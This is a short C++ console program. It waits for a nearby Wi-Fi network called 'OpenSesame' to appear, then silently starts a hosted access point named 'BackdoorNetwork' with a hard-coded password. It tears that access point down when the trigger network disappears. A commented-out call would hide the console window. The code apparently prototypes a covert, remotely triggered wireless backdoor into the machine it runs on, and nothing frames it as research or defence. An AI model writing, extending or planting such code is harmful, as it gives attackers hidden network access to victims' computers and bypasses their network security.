// testWhn.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <iostream>
#include <conio.h>

#include "Wlan.h"


int _tmain( int argc, _TCHAR* argv [] )
{
    const char * ssid = "OpenSesame";
    const char * hostedNetworkSsid = "BackdoorNetwork";
    const char * hostedNetworkKey = "abcd12345";
    Wlan wlan;
	
	//FreeConsole();

    while (true) {
        std::wcout << _T( "scanning..." ) << std::endl;
        if (wlan.IsNetAvailable( ssid )) {
            std::wcout << _T( "network: " ) << ssid << _T( " found" ) << std::endl;

            if (wlan.StartHostedNet( hostedNetworkSsid, hostedNetworkKey, 100 )) {
                std::wcout << _T( "network: " ) << hostedNetworkSsid << _T( " created" ) << std::endl;
                std::wcout << _T( "now waiting for shutdown signal!" ) << std::endl;
                //_getch();

				while (true) {
					
					std::wcout << _T("sleeping 5 seconds") << std::endl;
					Sleep(5 * 1000);

					if (!wlan.IsNetAvailable(ssid)) {

						std::wcout << _T("shutdown received! closing hosted network!") << std::endl;

						wlan.StopHostedNet();

						break;
					}

				}
				
            }
            else {
                std::wcout << _T( "failed to create network: " ) << hostedNetworkSsid << std::endl;
                break;
            }
        }

        std::wcout << _T( "waiting 5 seconds..." ) << std::endl;
        Sleep( 5 * 1000 );
    }

    return 0;
}
